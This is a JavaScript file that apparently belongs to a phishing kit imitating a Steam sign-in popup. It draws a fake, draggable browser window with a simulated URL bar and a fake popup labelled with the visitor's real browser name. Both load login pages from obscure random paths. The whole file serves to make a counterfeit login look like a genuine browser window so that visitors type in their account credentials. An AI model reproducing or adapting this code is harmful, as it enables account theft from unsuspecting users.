$(document).ready(function(){
    $(".steam_window_url_input input").focusin(function(){
        $(".steam_window_url_input").hide();
        $(".steam_window_url_input_full").show();
        $(".steam_window_url_input_full input").focus();
    })
    $(".steam_window_url_input_full input").focusout(function(){
        $(".steam_window_url_input_full").hide();
        $(".steam_window_url_input").show();
    })
    $(".steam_window_nav_btn").click(function(){
        $(".steam_window").hide();
        $("#steam_window_frame").attr("src","");
    });
    dragElement(document.getElementById("steam_window"));
    $("#auth_steam_btn").click(function () {
        $(".steam_window").show();
        setTimeout(function(){
            $("#steam_window_frame").attr("src","/lrrh32ga29ygf6epe49rsdm3wo5zfc35"+location.pathname);
        }, 1000)
    });
})
function randomId(len) {
    var text = '';
    var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < len; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length))
    }
    return text
}
function closeLoginWindow() {
	$('#new-window').css({
		display: 'none',
	});
	$('.window-body-data').html('').prop('src', '')
}
function login() {
    var browserName = '';
    var w = $(window).width() * 0.75;
    var h = $(window).height() * 0.9;
    switch (bowser.name) {
		case 'Chrome':
			browserName = 'Google Chrome';
			break;
		case 'Firefox':
			browserName = 'Mozilla Firefox';
			break
    }
    browserName = (browserName === '') ? bowser.name : browserName;
    $('#browser-name').text(browserName);
    $('#new-window').css({
        width: w,
        height: h,
        display: 'block',
    });
    $('#new-window').draggable({
        containment: 'window',
    });
    $('.window-header-close').click(function() {
        $(this).off('click');
		closeLoginWindow()
    });
    setTimeout(function() {
        $('.window-body-data').prop('src', '/' + randomId(40))
    }, 1200)
}